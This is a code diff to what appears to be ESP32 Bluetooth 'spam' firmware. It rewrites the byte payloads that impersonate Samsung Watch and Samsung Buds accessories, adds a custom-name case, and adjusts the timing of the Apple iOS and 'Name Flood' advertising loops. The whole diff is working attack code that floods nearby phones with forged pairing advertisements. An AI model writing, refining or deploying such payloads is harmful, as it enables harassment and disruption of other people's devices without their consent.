@@ -204,61 +204,49 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
         }
         
         case SamsungWatch: {
-            // Fixed Samsung format
-            uint8_t samsungPayload[14] = {
-                0x02, 0x01, 0x06,
-                0x03, 0x03, 0x6F, 0xFD,
-                0x11, 0x07,
-                0x75, 0x00,
-                0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
-                specific_index >= 0 ? samsung_watch_ids[specific_index % 26] : samsung_watch_ids[random(26)]
-            };
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(samsungPayload, sizeof(samsungPayload));
-#else
-            AdvData.addData(std::string((char*)samsungPayload, sizeof(samsungPayload)));
-#endif
+            // Original Samsung Watch format
+            uint8_t prependedBytes[] = {0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43};
+            uint8_t watch_id = specific_index >= 0 ? samsung_watch_ids[specific_index % 26] : samsung_watch_ids[random(26)];
+            uint8_t samsungPayload[11];
+            memcpy(samsungPayload, prependedBytes, 10);
+            samsungPayload[10] = watch_id;
+            AdvData.setManufacturerData(std::string((char*)samsungPayload, 11));
             break;
         }
         
         case SamsungBuds: {
-            // Fixed Buds format
-            const char* budsId = getRandomBudsId();
-            uint8_t deviceId[3];
-            hexStringToBytes(budsId, deviceId, 3);
+            // Original Samsung Buds format
+            uint8_t prependedBuds[] = {0x42, 0x09, 0x81, 0x02, 0x14, 0x15, 0x03, 0x21, 0x01, 0x09};
+            uint8_t appendedBuds[] = {0x06, 0x3C, 0x94, 0x8E, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x00};
             
-            uint8_t budsPayload[17] = {
-                0x02, 0x01, 0x06,
-                0x03, 0x03, 0x6F, 0xFD,
-                0x0E, 0xFF, 0x75, 0x00,
-                0x42, 0x09, 0x81, 0x02,
-                deviceId[0], deviceId[1], deviceId[2],
-                0x00, 0x06, 0x3C, 0x94
-            };
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(budsPayload, sizeof(budsPayload));
-#else
-            AdvData.addData(std::string((char*)budsPayload, sizeof(budsPayload)));
-#endif
+            const char* budsId = getRandomBudsId();
+            char modifiedId[9];
+            strncpy(modifiedId, budsId, 4);
+            modifiedId[4] = '\0';
+            strcat(modifiedId, "01");
+            strcat(modifiedId, budsId + 4);
+            
+            uint8_t deviceBytes[4];
+            hexStringToBytes(modifiedId, deviceBytes, 4);
+            
+            uint8_t budsPayload[24];
+            memcpy(budsPayload, prependedBuds, 10);
+            memcpy(budsPayload + 10, deviceBytes, 4);
+            memcpy(budsPayload + 14, appendedBuds, 10);
+            
+            AdvData.setManufacturerData(std::string((char*)budsPayload, 24));
             break;
         }
         
         case SamsungRaw: {
-            // Alternative Samsung format
-            uint8_t rawPayload[26] = {
-                0x02, 0x01, 0x06,
-                0x03, 0x03, 0x6F, 0xFD,
-                0x16, 0xFF, 0x75, 0x00,
+            // Samsung Raw - Simpler format with just manufacturer data
+            uint8_t watch_id = samsung_watch_ids[random(26)];
+            uint8_t rawPayload[13] = {
+                0x75, 0x00,  // Samsung manufacturer ID
                 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
-                samsung_watch_ids[random(26)],
-                random(256), random(256), random(256), random(256),
-                random(256), random(256), random(256), random(256)
+                watch_id
             };
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(rawPayload, sizeof(rawPayload));
-#else
-            AdvData.addData(std::string((char*)rawPayload, sizeof(rawPayload)));
-#endif
+            AdvData.setManufacturerData(std::string((char*)rawPayload, 13));
             break;
         }
         
@@ -276,6 +264,11 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, int spe
 #else
             AdvData.addData(std::string((char*)Google_Data, 14));
 #endif
+            break;
+        }
+        
+        case CustomName: {
+            // Handled separately in executeCustomSpam
             break;
         }
         
@@ -330,7 +323,7 @@ void executeCustomSpam(String spamName) {
     pAdvertising->addServiceUUID(BLEUUID("1812"));
     pAdvertising->setAdvertisementData(advertisementData);
     pAdvertising->start();
-    vTaskDelay(15 / portTICK_PERIOD_MS);  // Faster!
+    vTaskDelay(15 / portTICK_PERIOD_MS);
     pAdvertising->stop();
     vTaskDelay(5 / portTICK_PERIOD_MS);
 #if defined(CONFIG_IDF_TARGET_ESP32C5)
@@ -351,7 +344,7 @@ void aj_adv(int ble_choice) {
     timer = millis();
     
     while (1) {
-        if (millis() - timer > (ble_choice == 8 ? 20 : 50)) {  // Faster for NameFlood
+        if (millis() - timer > (ble_choice == 8 ? 20 : 50)) {
             switch (ble_choice) {
                 case 0:
                     displayTextLine("Apple iOS (" + String(count) + ")");
@@ -396,7 +389,7 @@ void aj_adv(int ble_choice) {
                     break;
                 case 8:
                     displayTextLine("Name Flood (" + String(count) + ")");
-                    executeSpam(NameFlood, 10);  // Fastest!
+                    executeSpam(NameFlood, 10);
                     break;
             }
             count++;
